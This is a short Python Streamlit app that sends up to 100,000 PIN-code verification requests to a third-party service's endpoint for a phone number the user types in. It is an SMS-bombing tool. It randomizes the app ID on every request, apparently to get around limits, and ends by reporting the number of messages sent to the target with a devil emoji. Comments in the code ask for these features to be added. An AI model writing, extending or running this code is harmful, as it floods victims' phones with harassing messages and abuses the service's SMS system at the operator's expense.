import streamlit as st
import requests
import random as r




def send_sms_request(phone_number, num_messages):
    """
    Send SMS request to the specified endpoint
    
    :param phone_number: Phone number to send SMS to
    :param num_messages: Number of SMS messages to send
    :return: List of response messages
    """
    
    responses = []
    
    #insted of this uvtu1imca can you do the random 10 charachter and number  string 
    #for the app id
    for _ in range(num_messages):
        try:
            # Generate random app id
            app_id = "".join([r.choice("abcdefghijklmnopqrstuvwxyz0123456789") for _ in range(10)])
            url = f"https://captainkorek.tornest.net:9337/user/requestPinCode/964{phone_number}/en/WC-Web-App-3af79c12-9c9b-4d73-afe3-{app_id}"
            response = requests.get(url)
            responses.append({
                "status_code": response.status_code,
                "response_text": response.text
            })
        except Exception as e:
            responses.append({
                "status_code": None,
                "response_text": str(e)
            })
    
    return responses
    

def main():
    st.title("SMS Request App")
    
    # Phone number input with default value
    phone_number = st.text_input(
        "Phone Number", 
        value="",
        help="Enter the phone number to send SMS to"
    )
    
    # Number of SMS messages input
    num_messages = st.number_input(
        "Number of SMS Messages", 
        min_value=1, 
        max_value=100000, 
        value=15,
        help="Select how many SMS messages to send"
    )
    
    # Send button
    if st.button("Send SMS Request"):
        with st.spinner('Sending SMS request(s)...'):
            responses = send_sms_request(phone_number, num_messages)
        
        # Display how many code send to it
        #but display realtime like message 1 sent, message 2 sent
        for i, response in enumerate(responses):
            st.write(f"Message {i + 1} sent")
        st.write(f"Sent {num_messages} SMS to {phone_number} 😈")


if __name__ == "__main__":
    main()



